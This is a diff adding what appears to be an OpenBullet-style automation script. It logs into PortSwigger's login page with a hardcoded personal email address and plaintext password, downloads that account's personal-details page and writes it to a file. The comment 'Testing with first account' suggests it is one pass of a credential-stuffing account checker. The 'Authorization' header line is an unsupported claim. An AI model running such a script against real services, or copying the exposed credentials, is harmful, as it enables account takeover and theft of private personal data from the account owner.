@@ -1,0 +1,53 @@
+## Extract Personal Details HTML
+## Login and fetch personaldetails page as HTML
+## Authorization: ROE-2026-PSW-042-V5
+
+SET VAR "baseUrl" "https://login.portswigger.net"
+SET VAR "planBaseUrl" "https://portswigger.net"
+SET VAR "outputFile" "personaldetails_output.html"
+
+PRINT "[*] Personal Details HTML Extractor"
+PRINT "[*] Testing with first account"
+PRINT ""
+
+## Test with first account
+SET VAR "email" "01.02shivamsingh@gmail.com"
+SET VAR "password" "o8LnJe#2,46&Z5t5(,_LW^x!4^zxH8b9"
+
+PRINT "Email: $<email>"
+PRINT "Password: $<password>"
+PRINT ""
+
+## Step 1: GET login page
+PRINT "Step 1: Fetching login page..."
+HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "loginPageRes"
+PRINT "✓ Login page fetched"
+PRINT ""
+
+## Step 2: POST credentials
+PRINT "Step 2: Posting credentials..."
+HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
+  CONTENT "username=$<email>&password=$<password>&action=default"
+  CONTENTTYPE "application/x-www-form-urlencoded"
+  -> VAR "loginRes"
+PRINT "✓ Credentials posted"
+PRINT ""
+
+## Step 3: Fetch personal details page
+PRINT "Step 3: Fetching personal details page..."
+HttpRequest GET $"<planBaseUrl>/users/youraccount/personaldetails" AutoRedirect=True -> VAR "pdRes"
+PRINT "✓ Personal details page fetched"
+PRINT ""
+
+## Step 4: Save HTML to file
+PRINT "Step 4: Saving HTML to file..."
+FileWrite $"<outputFile>" $"<pdRes>"
+PRINT "✓ HTML saved to: $<outputFile>"
+PRINT ""
+
+PRINT "============================================================"
+PRINT "EXTRACTION COMPLETE"
+PRINT "============================================================"
+PRINT "HTML file: $<outputFile>"
+PRINT "Check the file to see the structure and plan information"
+PRINT "============================================================"
